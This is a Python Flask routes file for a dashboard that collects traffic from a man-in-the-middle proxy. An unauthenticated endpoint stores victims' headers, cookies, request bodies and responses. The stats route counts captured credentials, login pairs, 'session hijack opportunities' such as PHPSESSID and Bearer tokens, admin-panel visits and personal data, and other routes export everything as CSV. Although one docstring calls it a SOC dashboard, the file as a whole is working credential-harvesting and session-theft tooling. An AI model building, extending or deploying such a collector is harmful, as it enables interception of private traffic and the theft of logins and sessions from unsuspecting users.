from flask import Blueprint, render_template, request, redirect, url_for, flash, jsonify, session, Response
from flask_login import login_user, login_required, logout_user, current_user
from extensions import db, bcrypt, socketio
from models import User, InterceptedData
from forms import LoginForm
import json, re, time, csv
from io import StringIO
from datetime import datetime, timedelta
from sqlalchemy import func, and_, or_, text


# AUTHENTICATION ROUTES
auth_bp = Blueprint("auth", __name__)

# Track failed login attempts
failed_attempts = {}

@auth_bp.route("/login", methods=["GET", "POST"])
def login():
    form = LoginForm()
    client_ip = request.remote_addr  # Get user's IP address

    # Prevent brute-force login attempts (Block for 1 minute after 5 failed attempts)
    if client_ip in failed_attempts and failed_attempts[client_ip]['count'] >= 5:
        time_diff = time.time() - failed_attempts[client_ip]['last_attempt']
        if time_diff < 60:  # User is still blocked
            return redirect(url_for("auth.login"))  # Redirect silently without flashing messages
        else:
            failed_attempts[client_ip]['count'] = 0  # Reset after timeout

    if request.method == "POST":
        username = request.form.get("username").strip()
        password = request.form.get("password").strip()

        # Validate username format
        if not re.match(r"^[A-Za-z0-9_]{3,50}$", username):
            return redirect(url_for("auth.login"))  # Redirect without flashing warning

        # Query user securely
        user = User.query.filter_by(username=username).first()

        if user and bcrypt.check_password_hash(user.password_hash, password):
            session.permanent = True  # Enable session expiration
            session.modified = True   # Update session timestamp
            login_user(user)

            # Reset failed attempts on successful login
            if client_ip in failed_attempts:
                del failed_attempts[client_ip]

            return redirect(url_for("dashboard.dashboard_page"))

        # Record failed attempt (but do not flash warning)
        if client_ip not in failed_attempts:
            failed_attempts[client_ip] = {'count': 1, 'last_attempt': time.time()}
        else:
            failed_attempts[client_ip]['count'] += 1
            failed_attempts[client_ip]['last_attempt'] = time.time()

    return render_template("login.html", form=form)


@auth_bp.route("/logout")
@login_required
def logout():
    logout_user()
    session.clear()  # Remove all session data
    flash("Logged out successfully.", "info")
    return redirect(url_for("auth.login"))

# DASHBOARD ROUTE
dashboard_bp = Blueprint("dashboard", __name__, url_prefix="/dashboard")

@dashboard_bp.route("/")
@login_required
def dashboard_page():
    return render_template("dashboard.html", user=current_user)

@dashboard_bp.route("/logs")
@login_required
def get_latest_logs():
    """Fetch the latest 100 intercepted logs from the database."""
    logs = InterceptedData.query.order_by(InterceptedData.received_at.desc()).limit(100).all()
    logs_data = [
        {
            "received_at": log.received_at.strftime("%Y-%m-%d %H:%M:%S") if log.received_at else "N/A",
            "device_id": log.device_id or "Unknown",
            "method": log.data_type or "Unknown",
            "url": log.url or "Unknown",
            "headers": json.dumps(log.headers) if log.headers else "{}",
            "cookies": json.dumps(log.cookies) if log.cookies else "{}",
            "query_params": json.dumps(log.query_params) if log.query_params else "{}",
            "request_body": json.dumps(log.request_body) if log.request_body else "{}",
            "response_body": json.dumps(log.response_body) if log.response_body else "{}"
        }
        for log in logs
    ]
    return jsonify(logs_data), 200


@dashboard_bp.route("/stats")
@login_required
def get_dashboard_stats():
    """Fetch live stats for the SOC dashboard with properly calculated active and offline users."""

    # Get the current server time (without utcnow())
    current_time = datetime.now()
    one_hour_ago = current_time - timedelta(hours=1)
    seven_days_ago = current_time - timedelta(days=7)

    # **Active Users (Last 1 Hour)**
    latest_logs_per_device = db.session.query(
        InterceptedData.device_id,
        func.max(InterceptedData.received_at).label("last_seen")
    ).group_by(InterceptedData.device_id).subquery()

    active_users_query = db.session.query(
        latest_logs_per_device.c.device_id,
        latest_logs_per_device.c.last_seen
    ).filter(
        latest_logs_per_device.c.last_seen >= one_hour_ago  # Correct time filter
    ).all()

    active_users_list = [
        {
            "device_id": user.device_id,
            "last_seen": user.last_seen.strftime("%Y-%m-%d %H:%M:%S")
        }
        for user in active_users_query
    ]

    active_users = len(active_users_list)

    # **Unique & Offline Users**
    unique_users_query = db.session.query(InterceptedData.device_id).distinct().all()
    unique_users = len(unique_users_query)

    offline_users_list = list(
        set(user[0] for user in unique_users_query) - set(u["device_id"] for u in active_users_list)
    )
    offline_users = len(offline_users_list)

    # **Captured Credentials**
    sensitive_keywords = ["username", "password", "user", "pwd", "pass", "email", "token", "auth", "session", "apikey", "jwt"]
    captured_credentials = db.session.query(InterceptedData).filter(
        or_(
            *[func.cast(InterceptedData.request_body, db.Text).ilike(f"%{kw}%") for kw in sensitive_keywords]
        )
    ).count()

    # **Potential Login Credentials**
    username_keywords = ["username", "user", "id", "login", "email", "uname"]
    password_keywords = ["password", "pass", "pwd", "passcode", "passphrase", "passwd"]
    potential_logins = db.session.query(InterceptedData).filter(
        and_(
            or_(*[func.cast(InterceptedData.request_body, db.Text).ilike(f"%{kw}%") for kw in username_keywords]),
            or_(*[func.cast(InterceptedData.request_body, db.Text).ilike(f"%{kw}%") for kw in password_keywords])
        )
    ).count()

    # High-risk session-related keywords
    high_risk_session_keywords = [
        "PHPSESSID", "JSESSIONID", "connect.sid", "sessionid",
        "access_token", "X-Auth-Token", "Bearer", "auth_token", "jwt"
    ]

    # Exclude common harmless session-like values (e.g., analytics, CSRF, tracking)
    safe_session_keywords = [
        "csrf_token", "xsrf_token", "ga_session", "analytics_session", "tracking_id"
    ]

    session_hijack_opportunities = db.session.query(InterceptedData).filter(
        and_(
            or_(
                # Check cookies, query params, and response bodies for high-risk session keywords
                *[func.cast(InterceptedData.cookies, db.Text).ilike(f"%{kw}%") for kw in high_risk_session_keywords],
                *[func.cast(InterceptedData.query_params, db.Text).ilike(f"%{kw}%") for kw in
                  high_risk_session_keywords],
                *[func.cast(InterceptedData.response_body, db.Text).ilike(f"%{kw}%") for kw in
                  high_risk_session_keywords],
                *[func.cast(InterceptedData.headers, db.Text).ilike("Authorization")]
            ),
            # Exclude logs that contain only safe session names
            ~or_(
                *[func.cast(InterceptedData.cookies, db.Text).ilike(f"%{kw}%") for kw in safe_session_keywords],
                *[func.cast(InterceptedData.query_params, db.Text).ilike(f"%{kw}%") for kw in safe_session_keywords],
                *[func.cast(InterceptedData.response_body, db.Text).ilike(f"%{kw}%") for kw in safe_session_keywords]
            )
        )
    ).count()

    # **Total HTTP Access Count**
    http_access_count = db.session.query(InterceptedData).filter(
        InterceptedData.url.ilike("http://%")
    ).count()

    # **Admin Panel Access Detection**
    admin_urls = ["admin", "wp-admin", "dashboard", "superuser", "root", "manage", "control", "panel"]
    admin_logins = db.session.query(InterceptedData).filter(
        or_(
            *[func.cast(InterceptedData.url, db.Text).ilike(f"%{kw}%") for kw in admin_urls]
        )
    ).count()

    # **Logs Captured Per Day (Last 7 Days)**
    logs_per_day = db.session.query(
        func.date(InterceptedData.received_at),
        func.count(InterceptedData.id)
    ).filter(
        InterceptedData.received_at >= seven_days_ago
    ).group_by(
        func.date(InterceptedData.received_at)
    ).all()
    log_data = [{"date": str(log_date), "count": log_count} for log_date, log_count in logs_per_day]

    # **Logs Per Hour (Last 7 Days)**
    logs_by_hour_query = db.session.query(
        func.date(InterceptedData.received_at).label("log_date"),
        func.extract("hour", InterceptedData.received_at).label("log_hour"),
        func.count(InterceptedData.id).label("count")
    ).filter(
        InterceptedData.received_at >= seven_days_ago
    ).group_by("log_date", "log_hour").order_by("log_date", "log_hour").all()

    logs_by_hour = {}
    for entry in logs_by_hour_query:
        log_date = str(entry.log_date)
        log_hour = int(entry.log_hour)
        count = int(entry.count)

        if log_date not in logs_by_hour:
            logs_by_hour[log_date] = [0] * 24
        logs_by_hour[log_date][log_hour] = count

    # **HTTP Method Distribution**
    method_counts = db.session.query(
        InterceptedData.data_type, func.count(InterceptedData.data_type)
    ).group_by(InterceptedData.data_type).all()
    method_data = {method: count for method, count in method_counts}

    # **Sensitive Keywords for Personal Data**
    personal_data_keywords = [
        "phone", "mobile", "contact", "email", "address", "location", "home", "city",
        "state", "country", "zipcode", "postal", "social", "facebook", "instagram", "twitter", "linkedin"
    ]

    possible_personal_data = db.session.query(InterceptedData).filter(
        or_(
            *[func.cast(InterceptedData.request_body, db.Text).ilike(f"%{kw}%") for kw in personal_data_keywords],
            *[func.cast(InterceptedData.query_params, db.Text).ilike(f"%{kw}%") for kw in personal_data_keywords],
            *[func.cast(InterceptedData.headers, db.Text).ilike(f"%{kw}%") for kw in personal_data_keywords]
        )
    ).count()

    return jsonify({
        "total_captured": db.session.query(InterceptedData).count(),
        "unique_users": unique_users,
        "unique_users_list": [user[0] for user in unique_users_query],
        "active_users": active_users,
        "active_users_list": active_users_list,
        "offline_users": offline_users,
        "offline_users_list": offline_users_list,
        "captured_credentials": captured_credentials,
        "potential_logins": potential_logins,
        "session_hijack_opportunities": session_hijack_opportunities,
        "http_access_count": http_access_count,
        "admin_logins_detected": admin_logins,
        "possible_personal_data": possible_personal_data,
        "logs_per_day": log_data,
        "logs_by_hour": logs_by_hour,
        "http_methods": method_data
    }), 200

@dashboard_bp.route("/clear_logs", methods=["POST"])
@login_required
def clear_logs():
    try:
        db.session.query(InterceptedData).delete()
        db.session.commit()
        flash("All logs have been cleared!", "success")
        return jsonify({"status": "success", "message": "Logs cleared"}), 200
    except Exception as e:
        db.session.rollback()
        flash(f"Error clearing logs: {e}", "danger")
        return jsonify({"status": "error", "message": str(e)}), 500


# **MITM Intercepted Data Handling**
main_bp = Blueprint("main", __name__)

@main_bp.route("/intercepted", methods=["POST"])
def receive_data():
    """Receives intercepted request data from MITM Proxy."""
    try:
        data = request.json
        print(f"[DEBUG] Received data: {data}")

        new_entry = InterceptedData(
            device_id=data.get("device_id"),
            data_type=data.get("type"),
            url=data.get("url"),
            headers=data.get("headers"),
            cookies=data.get("cookies"),
            query_params=data.get("query_params"),
            request_body=data.get("request_body"),
            response_body=data.get("response_body")
        )

        db.session.add(new_entry)
        db.session.commit()
        socketio.emit("update_data", {"message": "New data received"})

        return jsonify({"status": "success", "message": "Data received"}), 200

    except Exception as e:
        print(f"[ERROR] Failed to insert data: {e}")
        return jsonify({"status": "error", "message": str(e)}), 400


search_bp = Blueprint("search", __name__, url_prefix="/search")

@search_bp.route("/latest_logs", methods=["GET"])
@login_required
def get_latest_logs():
    """Fetch the latest logs from the database."""
    logs = InterceptedData.query.order_by(InterceptedData.received_at.desc()).limit(100).all()
    logs_data = [
        {
            "received_at": log.received_at.strftime("%Y-%m-%d %H:%M:%S") if log.received_at else "N/A",
            "device_id": log.device_id or "Unknown",
            "data_type": log.data_type or "Unknown",
            "url": log.url or "Unknown",
            "headers": json.dumps(log.headers) if log.headers else "{}",
            "cookies": json.dumps(log.cookies) if log.cookies else "{}",
            "query_params": json.dumps(log.query_params) if log.query_params else "{}",
            "request_body": json.dumps(log.request_body) if log.request_body else "{}",
            "response_body": json.dumps(log.response_body) if log.response_body else "{}"
        }
        for log in logs
    ]
    return jsonify(logs_data), 200


@search_bp.route("/", methods=["GET"])
@login_required
def search_page():
    """Return JSON logs when requested via AJAX, otherwise render the full search page."""

    # Extract static filters (ignoring page, logic, and hiddenFilters)
    filters = {key: value.strip() for key, value in request.args.items()
               if value.strip() and key not in ["page", "logic", "hiddenFilters"]}

    # Extract dynamic filters from JSON
    dynamic_filters = json.loads(request.args.get("hiddenFilters", "[]"))

    use_or_logic = request.args.get("logic") == "or"
    match_case = request.args.get("match_case") == "true"
    page = request.args.get("page", 1, type=int)
    per_page = 10

    logs_query = InterceptedData.query
    conditions = []

    # Apply date filters (Start Date and End Date)
    start_date = request.args.get("received_at_start")
    end_date = request.args.get("received_at_end")

    if start_date:
        try:
            start_date = datetime.strptime(start_date, "%Y-%m-%dT%H:%M")
            conditions.append(InterceptedData.received_at >= start_date)
        except ValueError:
            pass

    if end_date:
        try:
            end_date = datetime.strptime(end_date, "%Y-%m-%dT%H:%M")
            conditions.append(InterceptedData.received_at <= end_date)
        except ValueError:
            pass

    # Static filters processing (applies OR logic within each field)
    for field, value in filters.items():
        if hasattr(InterceptedData, field):
            column_attr = getattr(InterceptedData, field)
            search_terms = value.split()

            if match_case:
                term_conditions = [func.cast(column_attr, db.Text).ilike(f"%{word}%") for word in search_terms]
            else:
                term_conditions = [func.lower(func.cast(column_attr, db.Text)).ilike(f"%{word.lower()}%") for word in search_terms]

            conditions.append(or_(*term_conditions))  # OR logic within input field

    # Dynamic filters processing
    for dynamic_filter in dynamic_filters:
        field = dynamic_filter.get("field")
        value = dynamic_filter.get("value")

        if hasattr(InterceptedData, field):
            column_attr = getattr(InterceptedData, field)
            search_terms = value.split()

            if match_case:
                term_conditions = [func.cast(column_attr, db.Text).ilike(f"%{word}%") for word in search_terms]
            else:
                term_conditions = [func.lower(func.cast(column_attr, db.Text)).ilike(f"%{word.lower()}%") for word in search_terms]

            conditions.append(or_(*term_conditions))  # OR logic within input field

    # Apply filters to query
    if conditions:
        if use_or_logic:
            logs_query = logs_query.filter(or_(*conditions))  # OR logic between filters
        else:
            logs_query = logs_query.filter(and_(*conditions))  # AND logic between filters

    # Get total logs count
    total_logs = logs_query.count()

    # Pagination
    pagination = logs_query.order_by(InterceptedData.received_at.desc()).paginate(
        page=page, per_page=per_page, error_out=False
    )
    logs = pagination.items

    # ✅ Return JSON if it's an AJAX request
    if request.headers.get("X-Requested-With") == "XMLHttpRequest":
        logs_data = [
            {
                "received_at": log.received_at.strftime("%Y-%m-%d %H:%M:%S") if log.received_at else "N/A",
                "device_id": log.device_id or "Unknown",
                "data_type": log.data_type or "Unknown",
                "url": log.url or "Unknown",
                "headers": json.dumps(log.headers) if log.headers else "{}",
                "cookies": json.dumps(log.cookies) if log.cookies else "{}",
                "query_params": json.dumps(log.query_params) if log.query_params else "{}",
                "request_body": json.dumps(log.request_body) if log.request_body else "{}",
                "response_body": json.dumps(log.response_body) if log.response_body else "{}"
            }
            for log in logs
        ]
        return jsonify({"logs": logs_data, "total_pages": max(1, -(-total_logs // per_page)), "page": page}), 200  # ✅ Send JSON response

    # Otherwise, return the full page as normal
    return render_template(
        "search.html",
        logs=logs,
        page=page,
        total_pages=max(1, -(-total_logs // per_page)),
        filters=filters,
        dynamic_filters=json.dumps(dynamic_filters)  # Pass dynamic filters back to the template
    )


@search_bp.route("/download_csv", methods=["GET"])
@login_required
def download_csv():
    """Generate and return a CSV file containing all intercepted logs."""
    logs = InterceptedData.query.order_by(InterceptedData.received_at.desc()).all()

    # Create CSV output in memory
    csv_output = StringIO()
    csv_writer = csv.writer(csv_output)

    # Write CSV Headers
    csv_writer.writerow(
        ["Received At", "Device ID", "Method", "URL", "Headers", "Cookies", "Query Params", "Request Body",
         "Response Body"])

    # Write Log Entries
    for log in logs:
        csv_writer.writerow([
            log.received_at.strftime("%Y-%m-%d %H:%M:%S") if log.received_at else "N/A",
            log.device_id or "Unknown",
            log.data_type or "Unknown",
            log.url or "Unknown",
            json.dumps(log.headers) if log.headers else "{}",
            json.dumps(log.cookies) if log.cookies else "{}",
            json.dumps(log.query_params) if log.query_params else "{}",
            json.dumps(log.request_body) if log.request_body else "{}",
            json.dumps(log.response_body) if log.response_body else "{}"
        ])

    # Return CSV as downloadable file
    response = Response(csv_output.getvalue(), mimetype="text/csv")
    response.headers["Content-Disposition"] = "attachment; filename=intercepted_logs.csv"

    return response


@search_bp.route("/download_filtered_csv", methods=["GET"])
@login_required
def download_filtered_csv():
    """Generate and return a CSV file containing only the filtered logs."""

    # Extract filters from request arguments
    filters = {key: value.strip() for key, value in request.args.items()
               if value.strip() and key not in ["page", "logic", "hiddenFilters"]}
    dynamic_filters = json.loads(request.args.get("hiddenFilters", "[]"))

    use_or_logic = request.args.get("logic") == "or"
    match_case = request.args.get("match_case") == "true"

    # Base query
    logs_query = InterceptedData.query
    conditions = []

    # Apply static filters
    for field, value in filters.items():
        if hasattr(InterceptedData, field):
            column_attr = getattr(InterceptedData, field)
            search_terms = value.split()
            if match_case:
                term_conditions = [func.cast(column_attr, db.Text).ilike(f"%{word}%") for word in search_terms]
            else:
                term_conditions = [func.lower(func.cast(column_attr, db.Text)).ilike(f"%{word.lower()}%") for word in
                                   search_terms]
            conditions.append(or_(*term_conditions))

    # Apply dynamic filters
    for dynamic_filter in dynamic_filters:
        field = dynamic_filter.get("field")
        value = dynamic_filter.get("value")
        if hasattr(InterceptedData, field):
            column_attr = getattr(InterceptedData, field)
            search_terms = value.split()
            if match_case:
                term_conditions = [func.cast(column_attr, db.Text).ilike(f"%{word}%") for word in search_terms]
            else:
                term_conditions = [func.lower(func.cast(column_attr, db.Text)).ilike(f"%{word.lower()}%") for word in
                                   search_terms]
            conditions.append(or_(*term_conditions))

    # Apply conditions
    if conditions:
        if use_or_logic:
            logs_query = logs_query.filter(or_(*conditions))
        else:
            logs_query = logs_query.filter(and_(*conditions))

    logs = logs_query.order_by(InterceptedData.received_at.desc()).all()

    # Create CSV output
    csv_output = StringIO()
    csv_writer = csv.writer(csv_output)

    # Write headers
    csv_writer.writerow(
        ["Received At", "Device ID", "Method", "URL", "Headers", "Cookies", "Query Params", "Request Body",
         "Response Body"])

    # Write filtered logs
    for log in logs:
        csv_writer.writerow([
            log.received_at.strftime("%Y-%m-%d %H:%M:%S") if log.received_at else "N/A",
            log.device_id or "Unknown",
            log.data_type or "Unknown",
            log.url or "Unknown",
            json.dumps(log.headers) if log.headers else "{}",
            json.dumps(log.cookies) if log.cookies else "{}",
            json.dumps(log.query_params) if log.query_params else "{}",
            json.dumps(log.request_body) if log.request_body else "{}",
            json.dumps(log.response_body) if log.response_body else "{}"
        ])

    # Return CSV file
    response = Response(csv_output.getvalue(), mimetype="text/csv")
    response.headers["Content-Disposition"] = "attachment; filename=filtered_logs.csv"

    return response


@search_bp.route("/delete_log/<int:log_id>", methods=["DELETE"])
@login_required
def delete_log(log_id):
    """Deletes a specific log from the database."""
    log = InterceptedData.query.get(log_id)
    if log:
        db.session.delete(log)
        db.session.commit()
        return jsonify({"status": "success", "message": "Log deleted"}), 200
    return jsonify({"status": "error", "message": "Log not found"}), 404


